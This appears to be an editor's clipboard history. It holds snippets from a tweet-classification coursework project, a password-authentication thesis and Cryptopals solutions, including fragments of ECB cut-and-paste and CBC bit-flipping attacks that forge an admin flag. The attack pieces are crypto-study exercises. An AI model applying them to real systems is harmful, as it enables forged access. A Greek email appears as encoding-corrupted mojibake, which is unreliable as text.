	#     data_train["text"].values[i] = train_vectors[i]
	# for i, _ in enumerate(data_test["text"]):
	#     data_test["text"].values[i] = test_vectors[i]
b1ff2f6223c7729891c9f8a639ecc88f|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|96|12|V|python
	### Options:
	### weights: {'uniform', 'distance'}
	### algorithm: {‚Äòauto‚Äô, ‚Äòball_tree‚Äô, ‚Äòkd_tree‚Äô, ‚Äòbrute‚Äô}
cd461dea9d1b3ec566338ebcb2a44d30|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|14|1|V|python
	lemmatizer = WordNetLemmatizer() 
ba716946aa64eae23f4c1a549b04aa66|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|66|1|V|python
	    cleared_tweet = ' '.join([pstem.stem(word) for word in sentence.split(' ') if not word in stop_words])
612d3fbf00d1f1dc60472ceecbbff7e1|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|67|5|V|python
	    cleared_tweet = ' '.join([lemmatizer.lemmatize(word) for word in sentence.split(' ') if not word in stop_words])
4fe624d93fd9ee6eaccab31d3c3021af|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|67|60|v|python
	sentence.split(' ') if not word in stop_words
8f3574e82dcd97ca73c48cea7fa22550|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|65|1|V|python
	for i, sentence in enumerate(data_train["text"]):
cb741bbd6e1083e5009e8b8e054f4793|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|70|1|V|python
	    cleared_tweet = ' '.join([word for word in sentence.split(' ') if not word in stop_words])
	    if stem:
	        cleared_tweet = ' '.join([pstem.stem(word) for word in cleared_tweet.split(' ')])
	    if lemmatize:
	        cleared_tweet = ' '.join([lemmatizer.lemmatize(word) for word in cleared_tweet.split(' ')])
cbb00a5fdeb2d8e54dcdac028f1828c5|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|60|5|V|python
	    if loc == '':
789553c88e2d0d1758d9ce6fa0260cc2|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|60|5|V|python
	    if loc is None:
497d15ff3b1a91baea2af84322d0a115|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|59|13|V|python
	for loc in data_train['location']:
	    print(loc)
925a724cca40f9d476e857f5a5d5d3e5|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|134|1|V|python
	# print('Train Score is             : ' ,k_neighbors.score(X_train, y_train))
	# print('Test Score is              : ' ,k_neighbors.score(X_test, y_test))
	# y_pred = k_neighbors.predict(X_test)
	# print('F1 Score                   : ' ,f1_score(y_test,y_pred))
	
	
2ca5fe97c5e326ba49213821e8696ce0|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|121|1|V|python
	# print('Cross validation scores:')
	# print(cv_scores)
a6c06031c9799c18fdb2986dd2c0ffad|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|70|1|V|python
	    cleared_tweet = ' '.join([word for word in sentence.split(' ') if not word in stop_words])
433b04278c63fc0b5dcee08554c660fa|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|1|V|python
	    cleared_tweet = ' '.join([word for word in data_train['keyword'][i].split(' ') if not word in stop_words])
f8b0bc81444d1f9e837d4599c79dff1f|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|5|V|python
	    for word in data_train['keyword']:
97c34b576c28c0cb66b2aff0787a38ba|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|5|V|python
	    # cleared_tweet = ' '.join([word for word in data_train['keyword'][i].split(' ') if not word in stop_words])
	    # cleared_tweet = ' '.join([word for word in data_train['location'][i].split(' ') if not word in stop_words])
6a30370662da5939e82cc89618ba43dd|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|1|V|python
	    if i == 100:
	        print(cleared_tweet)
d8f1be05f6b4ad2ac2bdf24d5f5f1d5f|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|69|1|V|python
	for i, sentence in enumerate(data_train["location"].fillna('')):
1052d31e28c5a988a8fd0cc8c1cc5817|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|68|1|V|python
	train_cleared = []
131a8213e7a5f332261e3a425e1affc8|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|70|48|v|python
	cleared_tweet
e706cbe8e9ad9810c31c9f3e07ff3fbb|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|69|5|V|python
	    cleared_tweet = ' '.join([word for word in data_train['location'][i].fillna('') if not word in stop_words])
364f951992ebf63977487d3bc2f36984|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|48|^v|python
	str(zip(sentence.split(' '),data_train['location'].fillna('')))
a825fd38d391cd2f5838478ad97a2a37|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|70|5|V|python
	    test = ' '.join(''.join(word for word in zip(sentence.split(' '),data_train['location'].fillna(''))))
06d30db966a67a7ca75feded72c182da|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|5|V|python
	    print(test)
6bd22b4a9aac398a2ef83d6a79aef6d0|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|69|1|V|python
	data_train["text"] += data_train['location'].fillna('')
d5189de027922f81005951e6efe0efd5|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|70|35|v|python
	location
4c500281b68b5874696673aac9d37591|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|71|1|V|python
	print(data_test['text'].head(10))
9374e11b7809486a4830e9cedaf6d8dc|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|69|1|V|python
	# data_train["text"] += data_train['location'].fillna('')
	data_train["text"] += data_train['keyword'].fillna('')
651f7600f80dbec4f678596e58db2da1|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|57|1|V|python
	data_train = data_train.drop(['id','target'], axis=1)
0bf766aa9407995db6de305c116d4bf5|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|86|1|V|python
	data_train["text"] += data_train['keyword'].fillna('')
a306d1cb03583da7a8d95f00d1fa9169|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|87|1|v|python
	data_train["text"]
d0730af2fa4d5c7cf736db2802bea050|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|87|1|V|python
	train_cleared += data_train['keyword'].fillna('')
cefaf1e292add1567c82145a422f2065|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|85|1|V|python
	# data_train["text"] += data_train['location'].fillna('')
	# data_train["text"] += data_train['keyword'].fillna('')
39131cba2a8f6c1220a4acee20a9312d|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|41|1|V|python
	### Choose if you want to add the locations to the tweets
b4c0b6c75f651ee809fd20c087a4a533|file:///home/neo/Documents/epl448/disaster-tweets/k_neighbors.py|43|35|v|python
	locations
1f7b5fd8bd4249f428e19c95d3aa33e5|file:///tmp/neomutt-neo-1000-16994-6370236653279765108|20|7|v|mail
	ŒìŒµŒπŒ± œÉŒøœÖ ŒùŒµœåœÜœÖœÑŒµ,ŒòŒ± Œ∫Œ±œÑŒµŒ≤Œ¨œÉŒµœÑŒµ œÑŒø training dataset Œ±œÄœå œÑŒø kaggle. ŒëœÖœÑœå Œ∏Œ± œÑŒø œáœâœÅŒØœÉŒµœÑŒµ œÉŒµ ŒΩŒ≠Œø training Œ∫Œ±Œπ ŒΩŒ≠Œø testing. ŒòŒ± Œ∫Œ¨ŒΩŒµœÑŒµ œåŒªŒµœÇ œÉŒ±œÇ œÑŒπœÇ Œ¥ŒøŒ∫ŒπŒºŒ≠œÇ ŒºŒµ cross validation œÄŒ¨ŒΩœâ œÉœÑŒø ŒΩŒµŒø training Œ≥ŒπŒ± ŒΩŒ± ŒµœÄŒπŒªŒ≠ŒæŒµœÑŒµ œÄŒ±œÅŒ±ŒºŒ≠œÑœÅŒøœÖœÇ Œ∫Œ±Œπ ŒºŒøŒΩœÑŒ≠ŒªŒ± Œ∫Œ±Œπ Œ≥ŒπŒ± ŒΩŒ± Œ¥ŒøŒ∫ŒπŒºŒ¨Œ∂ŒµœÑŒµ œÑŒ∑ŒΩ ŒπŒ∫Œ±ŒΩœåœÑŒ∑œÑŒ± œÑŒøœÖ ŒµœÄŒπŒªŒµœáŒ∏ŒµŒΩœÑŒøœÇ ŒºŒøŒΩœÑŒ≠ŒªŒøœÖ Œ∏Œ± Œ¥ŒøŒ∫ŒπŒºŒ¨Œ∂ŒµœÑŒµ œÄŒ¨ŒΩœâ œÉœÑŒø ŒΩŒ≠Œø testing. ŒúŒµ Œ±œÖœÑŒø Œ∏Œ± œÉŒ±œÇ Œ≤Œ±Œ∏ŒºŒøŒªŒøŒ≥ŒÆœÉŒøœÖŒºŒµ. ŒëŒΩ Œ∏ŒµŒªŒµœÑŒµ ŒºŒµœÑŒ± Œ±œÄœå Œ∫Œ¨œÄŒøŒπŒµœÇ Œ¥ŒøŒ∫ŒπŒºŒ≠œÇ ŒΩŒ± Œ±ŒΩŒµŒ≤Œ¨Œ∂ŒµœÑŒµ Œ∫Œ±Œπ œÉœÑŒø kaggle ŒµŒØœÉŒ±œÉœÑŒµ ŒµœÖœÄœÅœåœÉŒ¥ŒµŒ∫œÑŒøŒπ ŒΩŒ± œÑŒø Œ∫Œ¨ŒΩŒµœÑŒµ. ŒëŒΩ œÄŒ¨œÑŒµ Œ∫Œ±ŒªŒ¨ Œ∫Œ±Œπ œÉœÑŒø kaggle Œ±Œ∫œåŒºŒ± Œ∫Œ±ŒªœçœÑŒµœÅŒ± Œ±ŒªŒªŒ± Œ¥ŒµŒΩ ŒµŒπŒΩŒ±Œπ Œ±œÖœÑŒøœÉŒ∫ŒøœÄŒøœÇ œÑŒø kaggle. ŒëŒΩ ŒµœÄŒπŒºŒ≠ŒΩŒµŒπ Œ∑ Œ±œÄŒøœÅŒØŒ± ŒΩŒ± Œ∫Œ±ŒΩŒøŒΩŒØœÉŒøœÖŒºŒµ ŒµŒΩŒ± short meeting œÉœÑŒø ms teams.ŒöŒ±Œªœå Œ±œÄœåŒ≥ŒµœÖŒºŒ±,Œ†Œ±œçŒªŒøœÇSent from my Samsung Galaxy smartphone.
89a21bbbb151b21fb9ac91ed53f9fc88|file:///home/neo/Documents/epl448/disaster-tweets/test.py|17|1|V|python
	from sklearn.naive_bayes import BernoulliNB
d521aed814bbbe32bf3cb2184013476c|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|10|1|V|python
	from sklearn.neighbors import KNeighborsClassifier
c069f2d9f490c46dcbe74ba4f4769e42|file:///home/neo/Documents/epl448/disaster-tweets/test.py|113|1|V|python
	print('BernoulliNB Model')
ecfd7555b63c5cfc8f8160ad56b5939b|file:///home/neo/Documents/epl448/disaster-tweets/test.py|110|1|V|python
	bernoulliNBModel = BernoulliNB(alpha=0.1)
	bernoulliNBModel.fit(X_train,y_train)
a0348a8836b2cef123614de9d3866a98|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|122|1|V|python
	k_neighbors = KNeighborsClassifier(n_neighbors = num_neighbours,
	                                       weights = k_weights,
a679aa6dd5359e94106a6cca42bc02e1|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|122|39|V|python
	                                      algorithm = k_alg)
ca7e660269870d38f480de08536fee93|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|123|36|v|python
	y_train
8b7d53fa02b968adee12e7f7d1d383c1|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|47|1|V|python
	### weights: {'uniform', 'distance'}
	### algorithm: {‚Äòauto‚Äô, ‚Äòball_tree‚Äô, ‚Äòkd_tree‚Äô, ‚Äòbrute‚Äô}
	num_neighbours = 3
	k_weights = 'distance'
	k_alg = 'brute'
a494d5c70b93a4a72ed265ef29f2ef1b|file:///home/neo/Documents/epl448/disaster-tweets/bernoulli.py|123|45|v|python
	k_neighbors
ee21d14f62f80255dbf2da9d8fcd668c|file:///home/neo/Documents/epl448/disaster-tweets/test.py|110|1|V|python
	decisionTreeModel = DecisionTreeClassifier(criterion= 'entropy',
	                                           max_depth = None, 
	                                           splitter='best', 
	                                           random_state=55)
50cce2373deb096a66500cf412965362|file:///home/neo/Documents/epl448/disaster-tweets/decision_tree.py|122|1|v|python
	decisionTreeModel
36a3bd22a42c69aacd3408f1a9c797d4|file:///home/neo/Documents/epl448/disaster-tweets/decision_tree.py|119|5|V|python
	model = KNeighborsClassifier(n_neighbors = num_neighbours,
	                                       weights = k_weights,
	                                      algorithm = k_alg)
aca4396b29ab2b9760fdca8608c27f53|file:///home/neo/Documents/epl448/disaster-tweets/test.py|117|1|V|python
	print('Decision Tree Model')
95b0319b35c251b2d50dfe7fed52e3de|file:///home/neo/Documents/epl448/disaster-tweets/test.py|18|1|V|python
	from sklearn.naive_bayes import GaussianNB
f2b2d3d6eed24d2541534a08171a6455|file:///home/neo/Documents/epl448/disaster-tweets/test.py|112|1|V|python
	print('GaussianNB Model')
feafe93546d5cbcce07427511a7af6ab|file:///home/neo/Documents/epl448/disaster-tweets/test.py|109|1|V|python
	gaussianNBModel = GaussianNB()
d824ea24caea7ac3f5bbc98a0f1f4781|file:///home/neo/Documents/epl448/disaster-tweets/gaussian.py|119|1|v|python
	gaussianNBModel
f0353c4fce81e7944736c68ece9bba92|file:///home/neo/Documents/epl448/disaster-tweets/gaussian.py|120|1|V|python
	model = KNeighborsClassifier(n_neighbors = num_neighbours,
86de7405ed802e030e76d9617c45a84a|file:///home/neo/Documents/epl448/disaster-tweets/gaussian.py|120|40|V|python
	                                       weights = k_weights,
48b5ae271f62024c4d324e852e32dc2f|file:///home/neo/Documents/epl448/disaster-tweets/test.py|119|1|V|python
	print('Gradient Boosting Model')
4a46c8931935beb3edcbf51175ddbf91|file:///home/neo/Documents/epl448/disaster-tweets/test.py|109|1|V|python
	gradientBoostingModel = GradientBoostingClassifier(loss = 'deviance',
	                                                   learning_rate = 0.01,
	                                                   n_estimators = 100,
	                                                   max_depth = 30,
	                                                   random_state=55)
9e4c3bb84fa2c6dba9a9a69de8d1a7b7|file:///home/neo/Documents/epl448/disaster-tweets/gradient_boosting.py|119|1|v|python
	gradientBoostingModel
5107c6f5ddb51ba839c5e5fde5fce102|file:///home/neo/Documents/epl448/disaster-tweets/test.py|116|1|V|python
	print('Logistic Regression')
9e3934190a151d0a16c90d87074d1305|file:///home/neo/Documents/epl448/disaster-tweets/test.py|110|1|V|python
	LogisticRegression = LogisticRegression(penalty='l2', 
	                                        solver='saga', 
	                                        random_state = 55)  
6c9b5576a1fdfaccea4e06393e36e730|file:///home/neo/Documents/epl448/disaster-tweets/logistic_regression.py|119|1|v|python
	LogisticRegression
73ade5ba2d4b100edc4c0bae106cbb61|file:///home/neo/Documents/epl448/disaster-tweets/test.py|19|1|V|python
	from sklearn.naive_bayes import MultinomialNB
372021697c0d6f852d5d0f20be03bfcc|file:///home/neo/Documents/epl448/disaster-tweets/test.py|108|1|V|python
	multinomialNBModel = MultinomialNB(alpha=0.1)
0c2d00bf8d4a7ccb48b7c125aa446f1f|file:///home/neo/Documents/epl448/disaster-tweets/test.py|111|1|V|python
	print('MultinomialNB Model')
b99cbbd0d25a8f35d57a75ac4c101895|file:///home/neo/Documents/epl448/disaster-tweets/multinomial_nb.py|119|1|v|python
	multinomialNBModel
1da762d466aa093b38f756a940250cb3|file:///home/neo/Documents/epl448/disaster-tweets/test.py|117|1|V|python
	print('SGD Classifier')
e08d43955116bced403b10866c6b7c5b|file:///home/neo/Documents/epl448/disaster-tweets/test.py|109|1|V|python
	SGDClassifier = SGDClassifier(loss = 'hinge', 
	                              penalty = 'l1',
	                              learning_rate = 'optimal',
	                              random_state = 55, 
	                              max_iter=100)
a68d7492b61d2cfc21ad2d9da3ba249a|file:///home/neo/Documents/epl448/disaster-tweets/sgd_classifier.py|119|1|v|python
	SGDClassifier
82ce8e2e6903b6fdd62ee165ebb33570|file:///home/neo/Documents/epl448/disaster-tweets/test.py|117|1|V|python
	print('SV Classifier')
9b8b0b504be376e78c315e7be92282d6|file:///home/neo/Documents/epl448/disaster-tweets/test.py|109|1|V|python
	SVClassifier = SVC(kernel= 'linear',
	                   degree=3,
	                   max_iter=10000,
	                   C=2, 
	                   random_state = 55)
4701e27eb34b27ea35662530b8b9b006|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|119|1|v|python
	SVClassifier
78cdeac478e1ba62b564cfc57b945f87|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|49|161|v|tex
	using
4e80a019177c791c48627d8ba9c3d504|file:///home/neo/cryptopals/set2/set2_sol.py|289|1|V|python
	    padded_bytes = pkcs7_pad(b'YELLOW SUBMARINE', 20)
a3f2144844c4ff46f0cc5d4e474ecb4d|file:///home/neo/cryptopals/set2/set2_sol.py|292|5|V|python
	    padded_bytes = pad 
b451996abae60a447e5ecb0984afa355|file:///home/neo/cryptopals/set2/set2_sol.py|12|19|V|python
	    if padding_size == 0:
	        return text_bytes
cc3da778d09d9e14acf324b823cf54ef|file:///home/neo/cryptopals/set2/set2_sol.py|289|46|V|python
	    padded_bytes = pad(b'YELLOW SUBMARINE', 17)
	    print(padded_bytes)
e6b8420ef51d4c53dfe71fa1ca3434a6|file:///home/neo/cryptopals/set2/set2_sol.py|6|1|V|python
	from Crypto.Util.Padding import pad
c322746cfeaeef722cc6c5b411424cbb|file:///home/neo/cryptopals/set2/set2_sol.py|40|15|v|python
	plain_block
7fdbf9d8c915761d078b1eae2a9b6fee|file:///home/neo/cryptopals/set2/set2_sol.py|40|1|V|python
	        print(cipher_block)
c482970edec352e46dc1ccd60c4e0a3f|file:///home/neo/cryptopals/set2/set2_sol.py|19|1|V|python
	def encrypt_aes_ecb(plaintext: bytes, key: bytes) -> bytes:
	    if not isinstance(plaintext, bytes) or not isinstance(key, bytes):
	        raise TypeError
	    plaintext = pkcs7_pad(plaintext, 16)
	    cipher = AES.new(key, AES.MODE_ECB)
	    return cipher.encrypt(plaintext)
d7dc2c35d0f59cbe63e634cdbc4b0c9a|file:///home/neo/cryptopals/set2/set2_sol.py|293|5|V|python
	    AES.
7bf465ada2c45c9d10b0edd1a643118e|file:///home/neo/cryptopals/set2/set2_sol.py|24|1|V|python
	    cipher = AES.new(key, AES.MODE_ECB)
	    return cipher.encrypt(plaintext)
8b9e4793701b038aeef297778d5edbd9|file:///home/neo/cryptopals/set2/set2_sol.py|295|5|V|python
	    cipher.encrypt(b"A")
fe218607ae473367e4aa7991ee834787|file:///home/neo/cryptopals/set2/set2_sol.py|294|5|V|python
	    cipher = AES.new(generate_random_bytes(16), AES.MODE_ECB)
887c41fc859aa267e4476ea3810f6ae0|file:///home/neo/cryptopals/set2/set2_sol.py|294|5|V|python
	    print(padded_bytes)
cc4d2c31da59b95e390e7f5a0b0341b4|file:///home/neo/cryptopals/set2/set2_sol.py|23|9|V|python
	        plaintext = pkcs7_pad(plaintext, 16)
273c4a5862e540a198787c1712b189d4|file:///home/neo/cryptopals/set2/set2_sol.py|41|24|V|python
	        print(cipher_block)
	        print(len(cipher_block))
05aacfc372ab838ecf13f2a845b666da|file:///home/neo/cryptopals/set2/set2_sol.py|35|1|V|python
	        print(prev_cipher_block)
	        print(len(prev_cipher_block))
	        print(plain_block)
	        print(len(plain_block))
f09a6688bcf3a36d30a2c9035f4a90c3|file:///home/neo/cryptopals/set2/set2_sol.py|291|1|V|python
	    # padded_bytes = pkcs7_pad(b'YELLOW SUBMARINE', 16)
44a5d46059483b3b5d7b9aba2d0a7db7|file:///home/neo/cryptopals/set2/set2_sol.py|232|1|V|python
	    pkcs7_pad_validate("ICE ICE BABY\x04\x04\x04\x04")
7e30603bbd52e1757e0d7dc4746f8bfa|file:///home/neo/cryptopals/set2/set2_sol.py|233|24|v|python
	"ICE ICE BABY\x04\x04\x04\x04"
de9fe6a42bf51fd6065690e47c7e640e|file:///home/neo/cryptopals/set2/set2_sol.py|234|1|v|python
	"ICE ICE BABY\x05\x05\x05\x05"
efef0ac854d8a67cd3057b2113d7bc71|file:///home/neo/cryptopals/set2/set2_sol.py|233|1|V|python
	    pkcs7_pad_validate(b"ICE ICE BABY\x05\x05\x05\x05")
5de8c99bf834e3c23ec33f0c66b51737|file:///home/neo/cryptopals/set2/set2_sol.py|235|1|v|python
	"ICE ICE BABY\x01\x02\x03\x04"
2ce2ea6b66d2df435b210836004a43c0|file:///home/neo/cryptopals/set2/set2_sol.py|233|1|V|python
	    print(unpadded)
e80ba8bbd4a08a2f1191c9f83073c0ce|file:///home/neo/cryptopals/set2/set2_sol.py|194|1|V|python
	    badchars = ['&', '=']
	    email_str = email.decode('utf-8')
	    for c in badchars:
	        if c in email_str:
	            email_str = email_str[:email_str.index(c)]
67eb00e92ea18bc88bef29e8a6a48d3b|file:///home/neo/cryptopals/set2/set2_sol.py|236|5|V|python
	    email_str = email.decode('utf-8')
add42e1151de7765a126fa11fae3e96f|file:///home/neo/cryptopals/set2/set2_sol.py|237|17|v|python
	email_str
cd1aa399a699c388e6999332cb10afde|file:///home/neo/cryptopals/set2/set2_sol.py|211|1|V|python
	    decr = decrypt_aes_ecb(enc_profile, key).decode('utf-8')
fa2663b21b83c604f266b81bd195c3ed|file:///home/neo/cryptopals/set2/set2_sol.py|249|28|v|python
	enc_profile
5031e9989ae1ab3ba509b7d4220c0ddf|file:///home/neo/cryptopals/set2/set2_sol.py|259|11|v|python
	encrypted
7c9b2c23c8c3e22688a9f1aa93c4e79f|file:///home/neo/cryptopals/set2/set2_sol.py|242|5|V|python
	    userdata = bytes(userdata, 'utf-8')
dd83f8f5aa72d98de229e522af8366f6|file:///home/neo/cryptopals/set2/set2_sol.py|239|5|V|python
	    print(userdata)
224f6a2be78532e2ed0df60ab671adcd|file:///home/neo/cryptopals/set2/set2_sol.py|184|1|V|python
	    params = query_str.split('&')
	    data = {}
	    for param in params:
	        split = param.split('=')
	        data[split[0]] = split[1]
c02a94785d02df1a72381a0e23d7337d|file:///home/neo/cryptopals/set2/set2_sol.py|264|5|V|python
	    print(decrypted)
b0b1995dd4d759e3240ebc2943cfddc5|file:///home/neo/cryptopals/set2/set2_sol.py|250|14|v|python
	query_str
34ecb1a1510ca83c4c87683b1357325f|file:///home/neo/cryptopals/set2/set2_sol.py|257|12|v|python
	decrypted_data
4e83d0f437989e4dc8ee6dabe3038a07|file:///home/neo/cryptopals/set2/set2_sol.py|255|9|v|python
	comment1
6e1e03fa83fcc5b892997de5289aac4b|file:///home/neo/cryptopals/set2/set2_sol.py|235|1|V|python
	    prepend = "comment1=cooking%20MCs;userdata="
	    append = ";comment2=%20like%20a%20pound%20of%20bacon"
16483ba68be8b17f106f35fdfde1a9b0|file:///home/neo/cryptopals/set2/set2_sol.py|267|5|V|python
	    decrypted = decrypt_userdata()
862bf8386e97d7f90aab9d3fd588bcb3|file:///home/neo/cryptopals/set2/set2_sol.py|276|1|V|python
	    print(contains_admin)
6067a6a51e257a79f630deeb90e4a55c|file:///home/neo/cryptopals/set2/set2_sol.py|275|3|V|python
	    contains_admin = decrypt_userdata(encrypted, key, iv)
9b7fcc1c5501193c57cc8c8af1414642|file:///home/neo/cryptopals/set2/set2_sol.py|248|1|V|python
	    decr = decrypt_aes_cbc(encrypted, key, iv)
276ecfdda3c9b2d32a6a648d03fc9485|file:///home/neo/cryptopals/set2/set2_sol.py|265|5|V|python
	    target = 
745b099f7cf77503a1040bae39e06943|file:///home/neo/cryptopals/set2/set2_sol.py|265|5|V|python
	    print(prepend[:16])
51614d82815c6399c31c5638b7832add|file:///home/neo/cryptopals/set2/set2_sol.py|267|5|V|python
	    print(target_len)
7556e47fcb9e308fd92aa6c8656c0d1e|file:///home/neo/cryptopals/set2/set2_sol.py|268|5|V|python
	    print(len(ciphertext[:target_len]))
ef49dc33621bc12896625d315bdfb33f|file:///home/neo/cryptopals/set2/set2_sol.py|265|5|V|python
	    target = bytes(prepend[16:32], 'utf-8')
3a54aad4791f719dfd37e15c5b1f05dd|file:///home/neo/cryptopals/set2/set2_sol.py|266|5|v|python
	xored
06fd92bfba18aeafe2b8665898a8b439|file:///home/neo/cryptopals/set2/set2_sol.py|267|13|v|python
	xor_bytes(target, ciphertext[:target_len])
d3a162f4396755652c1dc57fd635100e|file:///home/neo/cryptopals/set2/set2_sol.py|264|5|V|python
	    append = ";comment2=%20like%20a%20pound%20of%20bacon"
f3e45cbb3a0a8ae7827cbdbe7446835d|file:///home/neo/cryptopals/set2/set2_sol.py|266|76|v|python
	pkcs7_pad(target, 16
2a102ca00eb4917152a9e3540b119985|file:///home/neo/cryptopals/set2/set2_sol.py|280|5|V|python
	    print(decr)
72c49727c6d980afc40864f934dfca0a|file:///home/neo/cryptopals/set2/set2_sol.py|279|26|v|python
	decrypt_aes_cbc(modified, key, iv)
da3fe3b76852e034d33eb2313f87faef|file:///home/neo/cryptopals/set2/set2_sol.py|260|5|v|python
	modify_ciphertext
7f905ab52a8ae5c7fbc013e32ef8a02b|file:///home/neo/cryptopals/set2/set2_sol.py|254|13|v|python
	[split[0]] = split[1]
3fcf3cf06f84d2d2e1211577b782a436|file:///home/neo/cryptopals/set2/set2_sol.py|254|9|V|python
	        data = []
2d2e7efe73740de40582bc2cac2aac52|file:///home/neo/cryptopals/set2/set2_sol.py|253|5|V|python
	        split = param.split('=')
7e4797a0bd28974bf3bccfaa3aec8061|file:///home/neo/cryptopals/set2/set2_sol.py|252|5|V|python
	    for param in params:
1dd0150459342080e0736e6e29e45972|file:///home/neo/cryptopals/set2/set2_sol.py|250|14|v|python
	decrypted_data.split(';')
408c81a487517bfc7befa691fef98f7e|file:///home/neo/cryptopals/set2/set2_sol.py|250|5|V|python
	    params = 
167aae2e8709fcbecbf0819d566f698f|file:///home/neo/cryptopals/set2/set2_sol.py|251|15|V|python
	    if 'admin' in data:
	        if data['admin'] == 'true':
	            return True
2f18d69c8a69e3ba6899ef1397501f1b|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|21|1|V|tex
	each time they login their plain password, which is very likely to be used
984d9c35eb0099f5bee33bc0f48b57ce|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|19|1|V|tex
	The mechanics of the password protection, which is based on
	storing the password hashed at the server, coerces the user to \emph{reveal}
	their plain password to the server each time they log in, which is very likely
	to already be used in other services, as well.
410485a90801f857763c4f3997665c06|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|18|1|V|tex
	% Attackers can then leverage application vulnerabilities and leak the database in order to crack all stored digests~\cite{sauth,honeywords}. 
633726c968895612fe1381d91b4defd7|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|36|35|v|tex
	for offering
8906626672ff7f2954b0fb66955148f6|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|50|39|v|tex
	for convincing
4e4497c27bcca66c12ade965aa33b535|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|51|1|v|tex
	Nevewrtheless
452faada9535dd2c46b4a95ff0cbc35c|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|51|71|v|tex
	correctly
7c2621d11d5975a4501338e07085c38a|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|55|37|v|tex
	for allowing
d60db28d94d538bbb249dcc7f2273ab1|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|55|66|v|tex
	offer
97378d9e51ef865ebaff1865aaba6b38|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|16|v|bib
	10.1145/2068816.2068840
5af4f9afe8723735e7277b6be749502f|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|10|v|bib
	5959136
c35782ce16bc121ab6597b3e415ef943|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|49|18|v|tex
	client-side
a2f30392ca721c81c5da55411f65fe54|file:///home/neo/cryptopals/set2/set2_sol.py|1|1|V|python
	#!/usr/bin/python3
	from set1.set1_sol import * 
ecd5d496038cb0ae1e372d2841748057|file:///home/neo/cryptopals/set2/set2_sol.py|1|1|V|python
	#!/usr/bin/python3
	from set1.set1_sol import * 
	import random
	import string
	from typing import Callable
4569a50d3699fb01d7dca4a0c8b568a0|file:///home/neo/cryptopals/set3/set3_sol.py|2|1|V|python
	from set1.set1_sol import * 
db832bdff07fdaf09480177f5e030022|file:///home/neo/cryptopals/set3/set3_sol.py|8|1|v|python
	 MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=
	MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=
	MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==
	MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==
	MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl
	MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==
	MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==
	MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=
	MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=
	MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93
db832bdff07fdaf09480177f5e030022|file:///home/neo/cryptopals/set3/set3_sol.py|8|1|v|python
